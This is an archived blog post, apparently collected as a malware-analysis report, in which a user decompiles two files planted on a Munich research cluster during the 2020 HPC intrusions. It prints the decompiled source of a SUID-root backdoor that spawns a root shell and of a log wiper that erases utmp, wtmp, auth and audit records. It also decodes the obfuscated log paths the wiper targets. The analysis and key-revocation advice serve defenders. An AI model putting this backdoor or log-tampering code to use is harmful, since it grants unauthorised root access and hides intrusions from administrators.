{
    "id": "9347c4ab-2b7e-4619-9fd8-75ec4ced72da",
    "created_at": "2023-01-12T15:05:15.584533Z",
    "updated_at": "2025-03-27T02:06:10.457203Z",
    "deleted_at": null,
    "sha1_hash": "03e83be41969e09719af218c4da7bd838780056d",
    "title": "2020-05-16 - High Performance Hackers",
    "authors": "",
    "file_creation_date": "2022-05-28T02:35:30Z",
    "file_modification_date": "2022-05-28T02:35:30Z",
    "file_size": 97209,
    "plain_text": "# High Performance Hackers\n\n**[atdotde.blogspot.com/2020/05/high-performance-hackers.html](https://atdotde.blogspot.com/2020/05/high-performance-hackers.html)**\n\n## In the last few days, there was news that several big academic high performance computing centers had been hacked. Here in Munich, LRZ, the Leibniz Rechenzentrum was affected but apparently also computers at the LMU faculty of physics (there are a few clusters in the institute's basement). You could hear that it were Linux systems that were compromised and the attackers left files in /etc/fonts.\n\n I could not resist and also looked for these files and indeed found those on one of the servers:\n```\nhelling@hostname:~$ cd /etc/fonts/\nhelling@hostname:/etc/fonts$ ls -la\ntotal 52\ndrwxr-xr-x  4 root root 4096 Apr 5 2018 .\ndrwxr-xr-x 140 root root 12288 May 14 10:07 ..\ndrwxr-xr-x  2 root root 4096 Aug 29 2019 conf.avail\ndrwxr-xr-x  2 root root 4096 Aug 29 2019 conf.d\n-rwsr-sr-x  1 root root 6256 Apr 5 2018 .fonts\n-rw-r--r--  1 root root 2582 Apr 5 2018 fonts.conf\n-rwxr-xr-x  1 root root 15136 Apr 5 2018 .low\n\n Uhoh, a dot-file with SUID root?!? I had an evening to spare so I could finally find out if I can use some of the forensic tools, that are around. As everybody know, the most important one is \"strings\". But neither strings .fonts nor strings .low revealed anything interesting about those programs. So we need some heavier lifting. I chose ghidra (thanks NSA for that) as my decompiler.\n\n Let's look at .fonts (the suid one) first. It consists of one central function that I called runbash. Here is what I got after some renaming of symbols:\n\n```\n\n-----\n\n```\nvoid runbash(void)\n{\n char arguments [4];\n char command [9];\n int i;\n command[0] = 'N';\n command[1] = '\\0';\n command[2] = '\\n';\n command[3] = '\\n';\n command[4] = 'J';\n command[5] = '\\x04';\n command[6] = '\\x06';\n command[7] = '\\x1b';\n command[8] = '\\x01';\n i = 0;\n while (i < 9) {\n  command[i] = command[i] ^ (char)i + 0x61U;\n  i = i + 1;\n }\n arguments[0] = '\\x03';\n arguments[1] = '\\x03';\n arguments[2] = '\\x10';\n arguments[3] = '\\f';\n i = 0;\n while (i < 4) {\n  arguments[i] = arguments[i] ^ (char)i + 0x61U;\n  i = i + 1;\n }\n setgid(0);\n setuid(0);\n execl(command,arguments,0);\n return;\n}\n\n## There are two strings, command and arguments and first there is some xoring with a loop variable going on. I ran that as a separate C program and what it produces is that command ends up as \"/bin/bash\" and arguments as \"bash\". So, all this program does is it starts a root shell. And indeed it does (i tried it on the server, of course it has been removed since then).\n\n The second program, .low, is a bit longer. It has a main function that mainly deals with command line options depending on which it calls one of three functions that I termed machmitfile(), machshitmitfile() and writezerosinfile() which all take a file name as argument and modify those files by removing lines or overwriting stuff with zeros or doing some other rewriting that I did not analyse in detail:\n\n```\n\n-----\n\n```\n/ WARNING: Could not reconcile some variable overlaps /\nulong main(int argc, char ** argv)\n{\n char * __s1;\n char * pcVar1;\n bool opbh;\n bool optw;\n bool optb;\n bool optl;\n bool optm;\n bool opts;\n bool opta;\n int numberarg;\n char uitistgleich[40];\n passwd * password;\n char * local_68;\n char opt;\n uint local_18;\n uint retval;\n char * filename;\n scramble( &UTMP, 0xd);\n scramble( &WTMP, 0xd);\n scramble( &BTMP, 0xd);\n scramble( &LASTLOG, 0x10);\n scramble( &MESSAGES, 0x11);\n scramble( &SECURE, 0xf);\n scramble( &WARN, 0xd);\n scramble( &DEBUG, 0xe);\n scramble( &AUDIT0, 0x18);\n scramble( &AUDIT1, 0x1a);\n scramble( &AUDIT2, 0x1a);\n scramble( &AUTHLOG, 0x11);\n scramble( &HISTORY, 0x1b);\n scramble( &AUTHPRIV, 0x11);\n scramble( &DEAMONLOG, 0x13);\n scramble( &SYSLOG, 0xf);\n scramble( &ACHTdPROZENTs, 7);\n scramble( &OPTOPTS, 0xb);\n scramble( &UIDISPROZD, 7);\n scramble( &ERRORARGSEXIT, 0x11);\n scramble( &ROOT, 4);\n filename = (char * ) 0x0;\n local_18 = 0;\n opbh = false;\n optw = false;\n optb = false;\n optl = false;\n optm = false;\n opts = false;\n opta = false;\n now = time((time_t * ) 0x0);\n while (_opt = getopt(argc, argv, & OPTOPTS), _opt != -1) {\n\n```\n\n-----\n\n```\n  switch (_opt) {\n  case 0x61:\n   opta = true;\n   break;\n  case 0x62:\n   optb = true;\n   break;\n  default:\n   printmessage();\n   /* WARNING: Subroutine does not return */\n   exit(1);\n  case 0x66:\n   filename = optarg;\n   break;\n  case 0x68:\n   opbh = true;\n   break;\n  case 0x6c:\n   optl = true;\n   break;\n  case 0x6d:\n   optm = true;\n   break;\n  case 0x73:\n   opts = true;\n   break;\n  case 0x74:\n   local_18 = 1;\n   numberarg = atoi(optarg);\n   if (numberarg != 0) {\n    numberarg = atoi(optarg);\n    now = (time_t) numberarg;\n    if ((0 < now) && (now < 0x834)) {\n     now = settime();\n    }\n   }\n   break;\n  case 0x77:\n   optw = true;\n  }\n }\n if (((((!opbh) && (!optw)) && (!optb)) && ((!optl && (!optm)))) && ((!opts &&\n(!opta)))) {\n  printmessage();\n }\n if (opbh) {\n  if (argc <= optind + 1) {\n   printmessage();\n   /* WARNING: Subroutine does not return */\n   exit(1);\n  }\n  if (filename == (char * ) 0x0) {\n   filename = & UTMP;\n  }\n  retval = machmitfile(filename, argv[optind], argv[(long) optind + 1], (ulong)\n\n```\n\n-----\n\n```\nlocal_18);\n } else {\n  if (optw) {\n   if (argc <= optind + 1) {\n    printmessage();\n    /* WARNING: Subroutine does not return */\n    exit(1);\n   }\n   if (filename == (char * ) 0x0) {\n    filename = & WTMP;\n   }\n   retval = machmitfile(filename, argv[optind], argv[(long) optind + 1], (ulong)\nlocal_18);\n  } else {\n   if (optb) {\n    if (argc <= optind + 1) {\n     printmessage();\n     /* WARNING: Subroutine does not return */\n     exit(1);\n    }\n    if (filename == (char * ) 0x0) {\n     filename = & BTMP;\n    }\n    retval = machmitfile(filename, argv[optind], argv[(long) optind + 1], (ulong)\nlocal_18);\n   } else {\n    if (optl) {\n     if (argc <= optind) {\n      printmessage();\n      /* WARNING: Subroutine does not return */\n      exit(1);\n     }\n     if (filename == (char * ) 0x0) {\n      filename = & LASTLOG;\n     }\n     retval = writezerosinfile(filename, argv[optind], argv[optind]);\n    } else {\n     if (optm) {\n      if (argc <= optind + 3) {\n       printmessage();\n       /* WARNING: Subroutine does not return */\n       exit(1);\n      }\n      if (filename == (char * ) 0x0) {\n       filename = & LASTLOG;\n      }\n      retval = FUN_00401bb0(filename, argv[optind], argv[(long) optind + 1],\n       argv[(long) optind + 2], argv[(long) optind + 3]);\n     } else {\n      if (opts) {\n       if (argc <= optind) {\n        printmessage();\n        /* WARNING: Subroutine does not return */\n        exit(1);\n       }\n\n```\n\n-----\n\n```\n       local_68 argv[optind];\n       if (filename == (char * ) 0x0) {\n        printmessage();\n       } else {\n        retval = machshitmitfile(filename, local_68, (ulong) local_18,\nlocal_68);\n       }\n      } else {\n       if (opta) {\n        if (argc <= optind + 1) {\n         printmessage();\n         /* WARNING: Subroutine does not return */\n         exit(1);\n        }\n        __s1 = argv[optind];\n        pcVar1 = argv[(long) optind + 1];\n        numberarg = strcmp(__s1, & ROOT);\n        if (numberarg == 0) {\n         local_18 = 1;\n        }\n        machmitfile( & WTMP, __s1, pcVar1, (ulong) local_18);\n        machmitfile( & UTMP, __s1, pcVar1, (ulong) local_18);\n        machmitfile( & BTMP, __s1, pcVar1, (ulong) local_18);\n        writezerosinfile( & LASTLOG, __s1, __s1);\n        machshitmitfile( & MESSAGES, __s1, (ulong) local_18, __s1);\n        machshitmitfile( & MESSAGES, pcVar1, (ulong) local_18, pcVar1);\n        machshitmitfile( & SECURE, __s1, (ulong) local_18, __s1);\n        machshitmitfile( & SECURE, pcVar1, (ulong) local_18, pcVar1);\n        machshitmitfile( & AUTHPRIV, __s1, (ulong) local_18, __s1);\n        machshitmitfile( & AUTHPRIV, pcVar1, (ulong) local_18, pcVar1);\n        machshitmitfile( & DEAMONLOG, __s1, (ulong) local_18, __s1);\n        machshitmitfile( & DEAMONLOG, pcVar1, (ulong) local_18, pcVar1);\n        machshitmitfile( & SYSLOG, __s1, (ulong) local_18, __s1);\n        machshitmitfile( & SYSLOG, pcVar1, (ulong) local_18, pcVar1);\n        machshitmitfile( & WARN, __s1, (ulong) local_18, __s1);\n        machshitmitfile( & WARN, pcVar1, (ulong) local_18, pcVar1);\n        machshitmitfile( & DEBUG, __s1, (ulong) local_18, __s1);\n        machshitmitfile( & DEBUG, pcVar1, (ulong) local_18, pcVar1);\n        machshitmitfile( & AUDIT0, __s1, (ulong) local_18, __s1);\n        machshitmitfile( & AUDIT0, pcVar1, (ulong) local_18, pcVar1);\n        machshitmitfile( & AUDIT1, __s1, (ulong) local_18, __s1);\n        machshitmitfile( & AUDIT1, pcVar1, (ulong) local_18, pcVar1);\n        machshitmitfile( & AUDIT2, __s1, (ulong) local_18, __s1);\n        machshitmitfile( & AUDIT2, pcVar1, (ulong) local_18, pcVar1);\n        machshitmitfile( & AUTHLOG, __s1, (ulong) local_18, __s1);\n        machshitmitfile( & AUTHLOG, pcVar1, (ulong) local_18, pcVar1);\n        machshitmitfile( & HISTORY, __s1, (ulong) local_18, __s1);\n        retval = machshitmitfile( & HISTORY, pcVar1, (ulong) local_18,\npcVar1);\n        password = getpwnam(__s1);\n        if (password != (passwd * ) 0x0) {\n         sprintf(uitistgleich, & UIDISPROZD, (ulong) password - > pw_uid);\n         machshitmitfile( & SECURE, uitistgleich, (ulong) local_18,\nuitistgleich);\n         machshitmitfile( & AUDIT0, uitistgleich, (ulong) local_18,\n\n```\n\n-----\n\n```\nuitistgleich);\n         machshitmitfile( & AUDIT1, uitistgleich, (ulong) local_18,\nuitistgleich);\n         retval = machshitmitfile( & AUDIT2, uitistgleich, (ulong) local_18,\nuitistgleich);\n        }\n       }\n      }\n     }\n    }\n   }\n  }\n }\n return (ulong) retval;\n}\n\n## But what are the file names? They sit in some memory locations pre-initialized at startup but remember, strings did not show anything interesting. But before anything else, a function scramble() is called on them:\nvoid scramble(char *p,int count)\n{\n int m;\n int i;\n if (0 < count) {\n  m = count * 0x8249;\n  i = 0;\n  while (m = (m + 0x39ef) % 0x52c7, i < count) {\n   p[i] = (byte)m ^ p[i];\n   m = m * 0x8249;\n   i = i + 1;\n  }\n }\n return;\n}\n\n As you can see, once more there is some xor-ing going on to hide the ascii filename. So, once more, I put the initial data as well as this function a in a separate C program and it produced:\n\n```\n\n-----\n\n```\n603130: /var/run/utmp\n60313e: /var/log/wtmp\n60314c: /var/log/btmp\n603160: /var/log/lastlog\n603180: /var/log/messages\n6031a0: /var/log/secure\n6031b0: /var/log/warn\n6031be: /var/log/debug\n6031d0: /var/log/audit/audit.log\n6031f0: /var/log/audit/audit.log.1\n603210: /var/log/audit/audit.log.2\n603230: /var/log/auth.log\n603250: /var/log/ConsoleKit/history\n603270: /var/log/authpriv\n603290: /var/log/daemon.log\n6032b0: /var/log/syslog\n\n## Ah, these are the log-files where you want to remove your traces.\n\n This is how far my analysis goes. In case, you want to look at this yourself, I put everything (both binaries, the Ghidra file, my separate C program) in a tar-ball for you to download.\n\n What all this does not show: How did the attackers get in in the first place (possibly by stealing some user's private keys on another compromised machine), how they did the privilege escalation to be able to produce a suid-root file and also, for how long they have been around. As you can see above, the files have a time stamp from over two years ago. But once you are root you can of course set this to whatever you want. But it's not clear why you wanted to back date your backdoor. I should stress that I am only a normal user on that server, so for example I don't have access to the backups to check if these files have really been around for that long.\n\n Furthermore, the things I found are not very sophisticated. Yes, they prevented my to find out what's going on with strings by obfuscating their strings. But the rest was all so straight forward that even amateur like myself with a bit of decompiling could figure our what is going on. Plus leaving your backdoor as a suid program laying around in the file system in plain sight is not very secretive (but possibly enough to be undetected for more than two years). So unless these two files are not explicitly there to be found, the attacker will not be the most subtle one.\n\n Which leaves the question about the attacker's motivation. Was it only for sports (bringing some thousand CPUs under control)? Was it for bitcoin mining (the most direct way to turn this advantage into material gain)? Or did they try to steal data/files etc?\n\n If you have an account on one of the affected machines (in our case that would be anybody with a physics account at LMU as at least one affected machine had your home directory mounted) you should revoke all your secret keys that were stored there (GPG or ssh, in the latter case that means in particular delete them from .ssh/authorizedkeys and\n\n```\n\n-----\n\n## .ssh/authorizedkeys2 everywhere, not just on the affected machines. And you should consider all data on those machines compromised (whatever that might have as consequences for you). If attackers had access to your ssh private keys, they could be as well on all machines that those allow to log into without entering further passwords/passphrases/OTPs.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-16 - High Performance Hackers.pdf"
    ],
    "report_names": [
        "2020-05-16 - High Performance Hackers.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535915,
    "ts_updated_at": 1743041170,
    "ts_creation_date": 1653705330,
    "ts_modification_date": 1653705330,
    "files": {
        "pdf": "https://archive.orkl.eu/03e83be41969e09719af218c4da7bd838780056d.pdf",
        "text": "https://archive.orkl.eu/03e83be41969e09719af218c4da7bd838780056d.txt",
        "img": "https://archive.orkl.eu/03e83be41969e09719af218c4da7bd838780056d.jpg"
    }
}